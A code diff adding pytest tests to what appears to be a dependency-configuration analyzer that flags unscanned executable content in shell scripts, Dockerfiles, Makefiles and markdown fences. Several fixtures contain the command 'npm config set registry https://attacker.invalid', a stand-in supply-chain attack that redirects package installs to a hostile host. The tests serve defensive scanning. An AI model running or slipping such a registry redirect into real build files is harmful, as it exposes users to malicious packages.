@@ -37,6 +37,7 @@ def _analyze(
     files: Mapping[str, str],
     *,
     components: Iterable[str] | None = None,
+    executable_paths: frozenset[str] | None = None,
     raw_file_cache: Mapping[str, bytes] | None = None,
     local_file_cache: Mapping[str, str] | None = None,
     artifact_inventory: list[ArtifactRecord] | None = None,
@@ -53,12 +54,16 @@ def _analyze(
         if artifact_inventory is not None
         else [classify_artifact(path, data) for path, data in raw.items()]
     )
+    kwargs: dict[str, object] = {}
+    if executable_paths is not None:
+        kwargs["executable_paths"] = executable_paths
     return _analyzer()(
         components=list(components) if components is not None else list(files),
         local_file_cache=local,
         raw_file_cache=raw,
         artifact_inventory=inventory,
         budget=budget or DependencyWorkBudget(),
+        **kwargs,
     )
 
 
@@ -81,6 +86,112 @@ def _assert_single_parse_limitation(analysis: Any, *, path: str, end_line: int) 
     assert limitation.reason is DependencySourceLimitationReason.PARSE_INCOMPLETE
     assert (limitation.path, limitation.start_line, limitation.end_line) == (path, 1, end_line)
     return limitation
+
+
+def test_analysis_exposes_applicable_and_inspected_config_spans() -> None:
+    clean = _analyze({".npmrc": "registry=https://registry.npmjs.org/\n"})
+    malformed = _analyze({"pip.conf": "[global\nindex-url=https://example.invalid\n"})
+
+    assert [(span.path, span.start_line, span.end_line) for span in clean.applicable_spans] == [
+        (".npmrc", 1, 2)
+    ]
+    assert clean.inspected_spans == clean.applicable_spans
+    assert [(span.path, span.start_line, span.end_line) for span in malformed.applicable_spans] == [
+        ("pip.conf", 1, 3)
+    ]
+    assert malformed.inspected_spans == ()
+
+
+@pytest.mark.parametrize(
+    ("path", "content", "executable_paths", "expected_ranges"),
+    [
+        (
+            "scripts/bootstrap.sh",
+            "npm config set registry https://attacker.invalid\n",
+            frozenset(),
+            [(1, 2)],
+        ),
+        (
+            "container/Dockerfile.release",
+            "FROM python:3.12\n  run npm config set registry https://attacker.invalid\n",
+            frozenset(),
+            [(1, 3)],
+        ),
+        (
+            "build/rules.mk",
+            "install:\n\tnpm config set registry https://attacker.invalid \\\n"
+            "  --continued\n\techo done\nnotes:\n  prose\n",
+            frozenset(),
+            [(2, 4)],
+        ),
+        (
+            "docs/setup.md",
+            "before\n  ~~~~bash title=x\nnpm config set registry https://attacker.invalid\n"
+            "  ~~~~~\nafter\n",
+            frozenset(),
+            [(2, 4)],
+        ),
+        (
+            "archive.zip!/bin/runner",
+            "npm config set registry https://attacker.invalid\n",
+            frozenset({"archive.zip!/bin/runner"}),
+            [(1, 2)],
+        ),
+    ],
+    ids=("shell", "docker", "make", "markdown", "nested-executable"),
+)
+def test_structural_executable_surfaces_are_localized_without_guessing_commands(
+    path: str,
+    content: str,
+    executable_paths: frozenset[str],
+    expected_ranges: list[tuple[int, int]],
+) -> None:
+    analysis = _analyze(
+        {path: content},
+        executable_paths=executable_paths,
+    )
+
+    assert analysis.findings == ()
+    assert [
+        (item.reason.value, item.path, item.start_line, item.end_line)
+        for item in analysis.limitations
+    ] == [
+        ("unscanned_executable_content", path, start_line, end_line)
+        for start_line, end_line in expected_ranges
+    ]
+    assert "attacker.invalid" not in repr(analysis.limitations)
+
+
+@pytest.mark.parametrize(
+    ("content", "expected_range"),
+    [
+        ("```\n\n#!/usr/bin/env bash\necho ok\n```\n", (1, 5)),
+        ("~~~\n# npm config set registry https://attacker.invalid\n", (1, 3)),
+    ],
+    ids=("untagged-shebang", "unmatched-prompt"),
+)
+def test_untagged_relevant_markdown_fences_are_bounded_by_shape(
+    content: str, expected_range: tuple[int, int]
+) -> None:
+    analysis = _analyze({"guide.md": content}, executable_paths=frozenset())
+
+    assert analysis.findings == ()
+    assert [
+        (item.reason.value, item.start_line, item.end_line) for item in analysis.limitations
+    ] == [("unscanned_executable_content", *expected_range)]
+
+
+def test_prose_and_unsupported_markdown_fences_remain_out_of_scope() -> None:
+    analysis = _analyze(
+        {
+            "README.md": "```python\nprint('hello')\n```\n",
+            "notes.txt": "npm config set registry https://attacker.invalid\n",
+        },
+        executable_paths=frozenset(),
+    )
+
+    assert analysis.findings == ()
+    assert analysis.limitations == ()
 
 
 def test_npm_uses_case_insensitive_last_values_and_code_owned_scopes() -> None:
